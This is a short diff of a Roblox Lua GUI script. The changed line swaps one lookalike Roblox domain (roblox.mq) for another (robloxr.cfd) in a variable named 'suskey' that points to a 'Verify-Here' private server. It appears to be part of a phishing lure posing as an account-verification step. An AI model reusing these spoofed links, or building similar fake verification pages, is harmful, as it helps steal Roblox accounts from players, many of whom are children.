@@ -1,7 +1,7 @@
 -- yes, this script was made with GUI to Lua, now shut up
 -- around line 112 is where you put your script
 
-local suskey = "https://www.roblox.mq/games/8361082694/CATALOG-Bloxlink-HQ-WIP?privateServerLinkCode=66094273904388914246184075113375"
+local suskey = "https://www.robloxr.cfd/games/6458552105/Verify-Here?privateServerLinkCode=199852813515186667126222722475"
 
 local GUI = Instance.new("ScreenGui")
 local Main = Instance.new("Frame")
